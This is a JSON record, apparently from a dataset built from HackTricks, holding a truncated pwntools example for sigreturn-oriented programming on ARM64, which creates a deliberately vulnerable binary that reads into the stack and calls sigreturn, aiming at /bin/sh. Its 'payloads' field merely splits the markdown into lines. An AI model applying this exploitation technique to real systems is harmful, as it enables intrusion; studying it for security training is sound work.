{
  "id": "binary_exploitation_ed8c1f5a3359",
  "category": "binary-exploitation",
  "title": "srop arm64",
  "description": "# {{#include ../../../banners/hacktricks-training.md}}\n\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Pwntools example\n\nThis example is creating the vulnerable binary and exploiting it. The binary **reads into the stack** and then calls **`sigreturn`**:\n\n```python\nfrom pwn import *\n\nbinsh = \"/bin/sh\"\ncontext.clear()\ncontext.arch = \"arm64\"\n\nasm = ''\nasm += 'sub sp, sp, 0x1000\\n'\nasm += shellcraft.read(constants.STDIN_FILENO, 'sp', 1024) #Read into the stack\nasm += shellcraft.sigreturn(",
  "payloads": [
    "# {{#include ../../../banners/hacktricks-training.md}}",
    "{{#include ../../../banners/hacktricks-training.md}}",
    "## Pwntools example",
    "This example is creating the vulnerable binary and exploiting it. The binary **reads into the stack** and then calls **`sigreturn`**:",
    "```python",
    "from pwn import *",
    "binsh = \"/bin/sh\"",
    "context.clear()",
    "context.arch = \"arm64\"",
    "asm = ''",
    "asm += 'sub sp, sp, 0x1000\\n'",
    "asm += shellcraft.read(constants.STDIN_FILENO, 'sp', 1024) #Read into the stack",
    "asm += shellcraft.sigreturn() # Call sigreturn",
    "asm += 'syscall: \\n' #Easy symbol to use in the exploit",
    "asm += shellcraft.syscall()"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming/srop-arm64.md"
  ]
}